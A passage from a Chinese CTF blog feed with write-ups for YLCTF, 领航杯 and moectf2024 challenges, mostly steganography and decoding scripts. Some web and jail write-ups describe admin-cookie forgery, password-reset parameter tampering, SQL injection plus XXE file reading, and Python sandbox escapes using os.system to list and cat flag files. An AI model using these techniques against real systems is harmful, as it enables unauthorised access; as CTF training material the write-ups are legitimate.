class="hljs-string">&#x27;temp1&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp2&#x27;</span>, <span class="hljs-string">&#x27;temp2&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp3&#x27;</span>, <span class="hljs-string">&#x27;temp3&#x27;</span>).replace(<span class="hljs-string">&#x27;$temp4&#x27;</span>, <span class="hljs-string">&#x27;temp4&#x27;</span>).replace(<span class="hljs-string">&#x27;$answer&#x27;</span>, <span class="hljs-string">&#x27;answer&#x27;</span>)<br>pre_content = pre_content.replace(<span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;math.log&#x27;</span>).replace(<span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;math.sqrt&#x27;</span>).replace(<span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;math.pow&#x27;</span>).replace(<span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;math.sin&#x27;</span>).replace(<span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;math.cos&#x27;</span>).replace(<span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;math.tan&#x27;</span>).replace(<span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;math.exp&#x27;</span>).replace(<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;abs&#x27;</span>)<br><br><span class="hljs-comment"># 计算表达式</span><br><span class="hljs-built_in">exec</span>(pre_content)<br><br><span class="hljs-comment"># 输出最终答案，保留两位小数</span><br>final_answer = <span class="hljs-built_in">round</span>(answer, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;答案: <span class="hljs-subst">&#123;final_answer:<span class="hljs-number">.2</span>f&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 准备 POST 请求的数据</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;user_answer&#x27;</span>: final_answer<br>&#125;<br><br>post_url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:33968/ca.php&#x27;</span> <br>response = session.post(post_url, data=data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;POST 请求的响应: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h5 id="round-3-pread"><a class="markdownIt-Anchor" href="#round-3-pread"></a> [Round 3] PRead</h5><p>目录穿越</p><p><img src="/../../images/ylctf/2024/pread.png" alt="pread"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年领航杯初赛</title>
    <link href="/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>团队最后获得比赛第七，简单记录一下内容部分题解是直接粘贴可能不详细。</p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3><p>扫二维码发送flag得到flag，就不截图了。hex转化</p><h3 id="seeme"><a class="markdownIt-Anchor" href="#seeme"></a> seeme</h3><p>给了一个文件告诉的是一堆255的信息，敏感的察觉可能和色有关最大255，尝试写脚本爆破，在120和511附件可以明显看到有文字的存在，在这附件开始爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageEnhance<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_pixel_values_from_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        pixel_values = []<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            values = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) != <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;每行必须包含 3 个值。错误行: <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br>            pixel_values.extend(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, values))<br>    <span class="hljs-keyword">return</span> pixel_values<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_image_from_pixels</span>(<span class="hljs-params">pixel_values, width, height</span>):<br>    expected_pixel_count = width * height * <span class="hljs-number">3</span><br>    actual_pixel_count = <span class="hljs-built_in">len</span>(pixel_values)<br><br>    <span class="hljs-keyword">if</span> actual_pixel_count &gt; expected_pixel_count:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;像素值数量多于要求，截取前 <span class="hljs-subst">&#123;expected_pixel_count&#125;</span> 个像素值...&quot;</span>)<br>        pixel_values = pixel_values[:expected_pixel_count]<br>    <span class="hljs-keyword">elif</span> actual_pixel_count &lt; expected_pixel_count:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;像素值数量少于要求，填充黑色像素...&quot;</span>)<br>        pixel_values.extend([<span class="hljs-number">0</span>] * (expected_pixel_count - actual_pixel_count))<br><br>    pixels = np.array(pixel_values, dtype=np.uint8).reshape((height, width, <span class="hljs-number">3</span>))<br>    image = Image.fromarray(pixels, <span class="hljs-string">&#x27;RGB&#x27;</span>)<br>    <span class="hljs-keyword">return</span> image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enhance_image</span>(<span class="hljs-params">image</span>):<br>    <span class="hljs-comment"># 调整亮度、对比度和颜色饱和度</span><br>    enhancer = ImageEnhance.Brightness(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.5</span>)  <span class="hljs-comment"># 提高亮度</span><br><br>    enhancer = ImageEnhance.Contrast(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.5</span>)  <span class="hljs-comment"># 提高对比度</span><br><br>    enhancer = ImageEnhance.Color(image)<br>    image = enhancer.enhance(<span class="hljs-number">1.2</span>)  <span class="hljs-comment"># 调整颜色饱和度</span><br><br>    <span class="hljs-keyword">return</span> image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;欢迎使用像素到图像生成器!&quot;</span>)<br><br>    input_file = <span class="hljs-string">&quot;file.txt&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;从 <span class="hljs-subst">&#123;input_file&#125;</span> 读取像素值...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        pixel_values = read_pixel_values_from_file(input_file)<br><br>        total_pixels = <span class="hljs-built_in">len</span>(pixel_values) // <span class="hljs-number">3</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;总像素数: <span class="hljs-subst">&#123;total_pixels&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 细化爆破 120 附近和 511 附近的宽度</span><br>        refined_resolutions = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">115</span>, <span class="hljs-number">126</span>)) + <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">505</span>, <span class="hljs-number">516</span>))  <span class="hljs-comment"># 细化爆破</span><br><br>        <span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> refined_resolutions:<br>            height = total_pixels // width<br>            <span class="hljs-keyword">if</span> width * height &gt; total_pixels:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;跳过 <span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span>，像素数据不足。&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成尺寸为 <span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span> 的图像...&quot;</span>)<br><br>            <span class="hljs-comment"># 创建原始图像</span><br>            image = create_image_from_pixels(pixel_values, width, height)<br><br>            <span class="hljs-comment"># 微调图像</span><br>            enhanced_image = enhance_image(image)<br><br>            <span class="hljs-comment"># 保存增强后的图像</span><br>            output_filename = <span class="hljs-string">f&quot;output_image_<span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span>.png&quot;</span><br>            enhanced_image.save(output_filename)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;增强后的图像已保存为 <span class="hljs-subst">&#123;output_filename&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>可以发现图片122*503是个完整的图片</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/output_image_122x503.png" alt="output_image_122x503"></p><p>在线找个网站镜像一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/seeme.png" alt="seeme"></p><p>得到的flag用官方的套子</p><p>CnHongKe{youc@n’tseeme}</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="兔兔"><a class="markdownIt-Anchor" href="#兔兔"></a> 兔兔</h3><p>下载文件得到一个图片，查看一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/%E5%85%94%E5%85%94.png" alt="兔兔"></p><p>应该是rabbit的编码，这首诗是木兰诗(mulanshi),用在线网站解密一下</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/tutu1.png" alt="tutu1"></p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="acxi"><a class="markdownIt-Anchor" href="#acxi"></a> acxi</h3><p>打开随便注册一个账号</p><p>然后正常登陆，告诉只有admin才有flag，尝试按get flag得到，没有回显进行抓包</p><p>进行change password看看</p><p>有一串这样的东西</p><p><code>HIDDEN_STATE=18&amp;HIDDEN_HIX=1052267119216&amp;HIDDEN_LANG=0&amp;new_password=</code></p><p><code>1052267119216</code>进行hex的转化得到<code>F5 0002 0270</code>，改为<code>F500010270</code>,再转为十进制得到<code>1052267053680</code>,放入然后随机个密码我输入的为admin</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/acix1.png" alt="acix1"></p><p>然后前端登陆就可以得到flag了</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/acix2.png" alt="acix2"></p><h3 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h3><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/ti1.png" alt="ti1"></p><p>点进去是个企业首页试了几个敏感目录有个/admin，试了几个敏感用户，不对，想到查看源码提示用户<code>Caster</code>，密码<code>123456</code>直接登进去</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/2.png" alt="2"></p><p>提示权限不够，两个按钮按了也没有用用burp抓包，看到cookie可以解密</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/3.png" alt="3"></p><p>用url解密再进行base64解密后，得到原始cookie为guest，想到把guest换成admin就能登陆</p><p>直接得到flag</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/4.png" alt="4"></p><h3 id="web-sql-xxe"><a class="markdownIt-Anchor" href="#web-sql-xxe"></a> web-sql-xxe</h3><p>点进去发现是个用户登录界面</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/web.png" alt="web"></p><p>试了弱密码，失败又回去看题目提示，提示了有sql对题目进行SQL注入后发现能够登录</p><p><img src="/../../images/%E9%A2%86%E8%88%AA%E6%9D%AF/2024/web1.png" alt="web1"></p><p>密码使用联合注入，用户名随意就可以登入，界面提示XXE，POST方式，打开bp抓包</p><p>提示读flag.php</p><p>拿XXE执行伪协议filter读flag.php</p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
      <tag>rce</tag>
      
      <tag>sql</tag>
      
      <tag>rabbit</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2024</title>
    <link href="/2024/10/12/moectf/moectf2024/"/>
    <url>/2024/10/12/moectf/moectf2024/</url>
    
    <content type="html"><![CDATA[<p>个人排名第25，后期就没怎么打了，复盘整理一下。</p><h1 id="0基础入门"><a class="markdownIt-Anchor" href="#0基础入门"></a> 0基础入门</h1><p>看完pdf，在群里输入识别码，获得flag</p><p><img src="/../../images/moectf/moectf2024/1.png" alt="1"></p><h1 id="安全杂项"><a class="markdownIt-Anchor" href="#安全杂项"></a> 安全杂项</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> signin</h2><p>登入网址，按照要求，给luo选择缺勤，其他签到</p><p>注意：完成所有要求再提交</p><h2 id="罗小黑战记"><a class="markdownIt-Anchor" href="#罗小黑战记"></a> 罗小黑战记</h2><p>打开发现是GIF，帧数藏图片，用工具提取内容</p><img src="/../../images/moectf/moectf2024/a.jpeg" alt="a" style="zoom:50%;"><img src="/../../images/moectf/moectf2024/b.jpeg" alt="b" style="zoom:50%;"><img src="/../../images/moectf/moectf2024/c.png" alt="c" style="zoom:75%;"><p>最后扫码得到 <strong>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</strong></p><h2 id="杂项入门指北"><a class="markdownIt-Anchor" href="#杂项入门指北"></a> 杂项入门指北</h2><p>得到海豹图片，尝试多种未果，注意到图片观察。其实有一段莫斯密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .<br></code></pre></td></tr></table></figure><p><img src="/../../images/moectf/moectf2024/haibao.png" alt="haibao"></p><p><strong>moectf{H4VE_A_G00D_T1ME}</strong></p><h2 id="ez_f5"><a class="markdownIt-Anchor" href="#ez_f5"></a> ez_F5</h2><p>头一次见这种隐写</p><p>先看到属性里面有编码，base32解密得到<code>no_password</code>,010打开进行分析，在里面看到提示</p><p><img src="/../../images/moectf/moectf2024/F5.png" alt="F5"></p><p>网上搜索一下是F5隐写，下载工具，上面的是密码得到flag</p><p><img src="/../../images/moectf/moectf2024/F5-1.png" alt="F5-1"></p><p><strong>moectf{F5_15_s0_lntere5t1n9}</strong></p><h2 id="so-many-m"><a class="markdownIt-Anchor" href="#so-many-m"></a> so many ‘m’</h2><p>字频统计的题目，写一个脚本出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_frequency_sort</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># 统计每个字符的频率</span><br>    frequency = Counter(text)<br><br>    <span class="hljs-comment"># 按照频率从高到低排序，如果频率相同则按字典序排序</span><br>    sorted_chars = <span class="hljs-built_in">sorted</span>(frequency.items(), key=<span class="hljs-keyword">lambda</span> x: (-x[<span class="hljs-number">1</span>], x[<span class="hljs-number">0</span>]))<br><br>    <span class="hljs-comment"># 拼接成排序后的字符序列</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span>.join(char <span class="hljs-keyword">for</span> char, count <span class="hljs-keyword">in</span> sorted_chars)<br><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-comment"># 测试输入</span><br>text = <span class="hljs-string">&quot;a!&#123;ivlotzkEm&#123;CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC&#125;sii&#125;tkb&#125;ugCD&#123;zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC&#125;eot#dcf&#123;ec@ccgqpfqMycysMuuou!en#&#123;g0cDmoyxTCMgt&#123;joT&#123;jnl0rhoklCe&#123;n0CnxprydeaTg0r&#123;avkEjckjEsxhaohs&#123;Trbkr!ffqip444uwrc&#125;nnevgtCT&#123;jCipogtipzdeDiqsy44rMfj&#123;MzCw#qwg&#123;T4m&#123;cuk!hwuncxdmddeurtsojakrjC#vTDd&#125;0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq&#125;kcf#Mpcam&#123;mml4i4mpDnedamcwtC0nem&#123;mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu&#123;poeTEhD!u0anvTTTbbi&#123;q&#125;zapcksMifDlovoeac@&#123;0keh0dg&#123;Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE&#125;eoD&#123;xcMnoCuebu0otdusiDknfvo0&#123;fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a&#125;0ixeEktws&#125;pMCfCigaTafg&#125;ffssmwwuTkTuls0&#123;M@c4e@&#123;D&#123;tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo&#123;et4kcCpcgcT&#125;vD&#125;m!g4&#123;E0!Mol0fpo!&#123;srT0pf&#123;cMuCx0bp&#123;ftTmExcrn&#125;0etonez!@C4tfa4aM00siztb@fomfD#&#123;#tMbo@jgb4CM0dEk0tea4aMCafn&quot;</span><br><br><span class="hljs-comment"># 获取结果并输出</span><br>result = char_frequency_sort(text)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><h2 id="捂住一只耳"><a class="markdownIt-Anchor" href="#捂住一只耳"></a> 捂住一只耳</h2><p>wav音频，先用audi代开，没发现波纹图的问题，大约在1min的时候会有数字读写，看了hint才猜出，按键盘上字母对应的列行，如63就是字母第六列第三行，即n</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">63 </span><span class="hljs-number">31</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">52</span> <span class="hljs-number">31</span> <span class="hljs-number">51</span> <span class="hljs-number">71</span> <span class="hljs-number">101</span><br></code></pre></td></tr></table></figure><p>最后的flag为moectf{nevergetup}</p><h2 id="abnormal-lag"><a class="markdownIt-Anchor" href="#abnormal-lag"></a> Abnormal lag</h2><p>这里用adu打开发现多频图里面有内容，需要进行观察得到flag，友情提醒的是字符只有a-f和数字</p><p><img src="/../../images/moectf/moectf2024/lag1.png" alt="lag1"></p><p><img src="/../../images/moectf/moectf2024/lag2.png" alt="lag2"></p><p>尝试后得到moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p><h2 id="moejail_lv1"><a class="markdownIt-Anchor" href="#moejail_lv1"></a> moejail_lv1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /tmp/.therealflag_*&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="moejail_lv2"><a class="markdownIt-Anchor" href="#moejail_lv2"></a> moejail_lv2</h2><p>用1一样的第一条先查看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现root权限可以看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918&#x27;</span>).read())<br></code></pre></td></tr></table></figure><h2 id="moejail_lv3"><a class="markdownIt-Anchor" href="#moejail_lv3"></a> moejail_lv3</h2><p>试了一下lv3,用2的代码可以打通，就不多赘述了</p><h2 id="the-upside-and-down"><a class="markdownIt-Anchor" href="#the-upside-and-down"></a> The upside and down</h2><p>010发现是逆转，写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># # 以二进制模式读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/a.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>     content = f.read()<br><br> <span class="hljs-comment"># 反转文件内容</span><br>reversed_content = content[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/new.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>      new_file.write(reversed_content)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br>lines = [line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines <span class="hljs-keyword">if</span> line.strip()]<br><br><span class="hljs-comment"># 将过滤后的内容写回文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.writelines(lines)<br><br></code></pre></td></tr></table></figure><p>扫一下得到flag</p><p><img src="/../../images/moectf/moectf2024/new.png" alt="new"></p><p><strong>https://balabala_towards:moectf{Fri3nds_d0n’t_lie!}//</strong></p><h2 id="the_secret_of_snowball"><a class="markdownIt-Anchor" href="#the_secret_of_snowball"></a> the_secret_of_snowball</h2><p>010打开开头改为FFD8，</p><p>得到第一段</p><p>第二段在010底部base64解密拼接得到flag</p><h2 id="解不完的压缩包"><a class="markdownIt-Anchor" href="#解不完的压缩包"></a> 解不完的压缩包</h2><p>先写脚本得到最后一层压缩包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_zip_file</span>(<span class="hljs-params">zip_name, output_dir</span>):<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>        zipf.extractall(output_dir)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    output_dir = <span class="hljs-string">&quot;.&quot;</span>  <span class="hljs-comment"># 使用当前目录进行解压</span><br>    prev_extracted_file = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        zip_name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.zip&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(zip_name):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: The file &#x27;<span class="hljs-subst">&#123;zip_name&#125;</span>&#x27; does not exist.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># Extract the current zip file</span><br>        extract_zip_file(zip_name, output_dir)<br><br>        <span class="hljs-keyword">if</span> prev_extracted_file:<br>            <span class="hljs-comment"># Delete the previously extracted zip file</span><br>            os.remove(prev_extracted_file)<br><br>        prev_extracted_file = zip_name<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All zip files have been extracted and processed.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>根据压缩包名称的提示，crc碰撞</p><p>利用Zipcrack.py进行爆破</p><p>得到key    *<strong>m:#P7j0</strong></p><p>最后解密得到flag</p><p><strong>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</strong></p><h2 id="每人至少300份"><a class="markdownIt-Anchor" href="#每人至少300份"></a> 每人至少300份</h2><p>一直在想脚本没看图片，然后利用word文档就行了简单的拼接，扫码得到一串字符,分析一会后发现了是base58加密得到了flag这题之后会有修复题</p><p><img src="/../../images/moectf/moectf2024/300%E9%97%AE%E5%8D%B7.png" alt="300问卷"></p><p>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??</p><p>key里面的内容进行解密得到flag.</p><h2 id="readme"><a class="markdownIt-Anchor" href="#readme"></a> readme</h2><p><code>/proc/self/fd/3</code></p><h2 id="find-it"><a class="markdownIt-Anchor" href="#find-it"></a> Find 